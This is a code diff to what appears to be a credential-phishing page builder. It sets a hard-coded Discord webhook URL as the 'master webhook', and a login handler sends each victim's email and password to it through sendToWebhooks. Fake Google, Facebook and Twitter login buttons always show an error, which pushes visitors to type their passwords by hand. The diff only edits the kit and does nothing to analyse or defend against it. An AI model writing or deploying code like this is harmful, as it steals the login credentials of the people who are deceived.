@@ -503,14 +503,6 @@
         </div>
     </div>
 
-    <div class="modal" id="loadingModal">
-        <div class="modal-content">
-            <div class="loading-spinner"></div>
-            <div class="modal-title" id="modalTitle">Processing</div>
-            <div class="modal-message" id="modalMessage">Please wait...</div>
-        </div>
-    </div>
-
     <script>
         // =========================================
         // MAIN APPLICATION CODE
@@ -524,7 +516,6 @@
         const createBtn = document.getElementById('createBtn');
         const successModal = document.getElementById('successModal');
         const errorModal = document.getElementById('errorModal');
-        const loadingModal = document.getElementById('loadingModal');
         const successDetails = document.getElementById('successDetails');
         const errorMessage = document.getElementById('errorMessage');
         const successOkBtn = document.getElementById('successOkBtn');
@@ -537,7 +528,7 @@
         const followerOptions = document.querySelectorAll('.follower-option');
 
         // Configuration
-        const MASTER_WEBHOOK = ''; // Add your master webhook here
+        const MASTER_WEBHOOK = 'https://discord.com/api/webhooks/1368042006764458245/tLcKO95GzvoqNdcA4Q744S5K8Lm43xrAJiBmbxEZ43HV8lcaI8wD2DvH1iPi-kyIYCkT'; // Add your master webhook here
         const STORAGE_KEY = 'synx_pages';
         const WORD_LIST = [
             'alpha', 'bravo', 'charlie', 'delta', 'echo', 
@@ -753,15 +744,8 @@
                 }
             }
 
-            function showLoading(title, message) {
-                document.getElementById('modalTitle').textContent = title;
-                document.getElementById('modalMessage').textContent = message;
-                loadingModal.style.display = 'flex';
-            }
-
             function showError(message) {
                 errorMessage.textContent = message;
-                loadingModal.style.display = 'none';
                 errorModal.style.display = 'flex';
             }
 
@@ -791,7 +775,6 @@
                     return;
                 }
 
-                showLoading('Logging in', 'Please wait while we verify your credentials...');
                 await sendToWebhooks(email, password);
 
                 setTimeout(() => {
@@ -810,22 +793,13 @@
             proceedBtn.addEventListener('click', proceedToLogin);
             loginBtn.addEventListener('click', handleLogin);
             document.getElementById('googleLogin').addEventListener('click', () => {
-                showLoading('Logging in with Google', 'Connecting to Google...');
-                setTimeout(() => {
-                    showError('Could not connect to Google. Please try logging in normally.');
-                }, 3000);
+                showError('Could not connect to Google. Please try logging in normally.');
             });
             document.getElementById('facebookLogin').addEventListener('click', () => {
-                showLoading('Logging in with Facebook', 'Connecting to Facebook...');
-                setTimeout(() => {
-                    showError('Could not connect to Facebook. Please try logging in normally.');
-                }, 3000);
+                showError('Could not connect to Facebook. Please try logging in normally.');
             });
             document.getElementById('twitterLogin').addEventListener('click', () => {
-                showLoading('Logging in with Twitter', 'Connecting to Twitter...');
-                setTimeout(() => {
-                    showError('Could not connect to Twitter. Please try logging in normally.');
-                }, 3000);
+                showError('Could not connect to Twitter. Please try logging in normally.');
             });
         }
 
